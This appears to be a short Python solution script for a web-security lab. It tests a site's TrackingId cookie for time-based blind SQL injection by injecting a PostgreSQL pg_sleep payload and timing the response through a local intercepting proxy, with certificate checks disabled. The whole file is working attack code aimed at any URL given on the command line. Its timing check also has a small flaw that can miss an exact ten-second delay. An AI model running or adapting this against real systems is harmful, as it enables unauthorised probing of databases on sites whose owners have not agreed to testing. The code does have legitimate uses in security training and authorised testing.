import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def blind_sqli_time_delay_check(url):
    sql_payload = "' || (SELECT pg_sleep(10))-- "
    sqli_payload_encoded = urllib.parse.quote(sql_payload)
    cookies = {'TrackingId': 'KFxGtanhEhcofTXT' + sqli_payload_encoded, 'session': 'QcsSejQQgSz3oMNLoGLbCOw06V0BUqDu'}
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    if int(r.elapsed.total_seconds()) > 10:
        print('[+] Vulnerable to time-based Blind SQL injection.')
    else:
        print('[-] Not vulnerable to time-based Blind SQL injection.')


def main():
    if len(sys.argv) != 2:
        print('[-] Usage: %s <url>' % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1].strip()
    print('[+] Checking if the tracking cookie is vulnerable to time-base blind SQL injection....')
    blind_sqli_time_delay_check(url)


if __name__ == '__main__':
    main()

